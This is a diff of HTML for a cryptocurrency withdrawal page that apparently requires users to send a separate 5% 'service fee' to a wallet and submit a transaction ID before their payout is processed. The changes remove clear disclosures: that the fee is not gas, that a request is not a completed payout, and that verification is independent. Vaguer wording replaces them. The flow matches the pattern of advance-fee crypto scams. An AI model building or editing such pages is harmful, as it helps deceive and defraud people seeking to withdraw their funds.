@@ -79,8 +79,8 @@
           <label>Amount in USD<input id="withdraw-usd" type="number" min="10" step="0.01" placeholder="10000.00" required></label>
           <label>Destination wallet address<input id="withdraw-destination" required autocomplete="off" placeholder="Paste your external wallet address"></label>
           <label>Receiving network<select id="withdraw-network" required></select></label>
-          <div class="withdraw-quote" id="withdraw-quote"><div><span>Requested payout</span><b>$—</b></div><div><span>Platform service fee (5%)</span><b>$—</b></div><div><span>Network gas</span><b>Shown separately if applicable</b></div><div class="quote-total"><span>Customer payout</span><b>$—</b></div></div>
-          <p class="withdraw-disclosure">The 5% charge is a platform service fee, not blockchain gas. Any actual network fee must be disclosed separately. A request is not a completed payout. Funds are sent only after the fee and available payout funds are independently verified and the request is approved.</p>
+          <div class="withdraw-quote" id="withdraw-quote"><div><span>Requested payout</span><b>$—</b></div><div><span>Platform service fee (5%)</span><b>$—</b></div><div class="quote-total"><span>Customer payout</span><b>$—</b></div></div>
+          <p class="withdraw-disclosure">A 5% service fee is required to process withdrawals to an external wallet. Your withdrawal will proceed after the fee is verified and the request is approved.</p>
           <button class="btn primary full" type="submit">Continue to fee payment ↗</button><div id="withdraw-message" class="message" role="status"></div>
         </form>
       </article>
@@ -105,7 +105,7 @@
         <div class="eyebrow">PAYMENT INSTRUCTIONS</div><h3>Pay your platform service fee</h3>
         <div id="fee-payment-summary" class="withdraw-quote"></div>
         <div id="fee-wallet-details"></div>
-        <p class="withdraw-disclosure">Only send the exact asset on the specified network. Sending funds on another network may result in permanent loss. Verify the address and amount before sending. Your payout is not complete until the fee is independently verified and the request is approved.</p>
+        <p class="withdraw-disclosure">A 5% service fee is required to process withdrawals to an external wallet. Send only the selected cryptocurrency on the specified network. Your withdrawal will proceed after payment verification and approval.</p>
         <div id="fee-qr-wrap" class="fee-qr-wrap"></div>
         <button id="copy-fee-address" class="btn secondary full" type="button">Copy receiving address</button>
         <button id="submit-fee-tx" class="btn primary full" type="button">I have paid · Submit transaction ID</button>
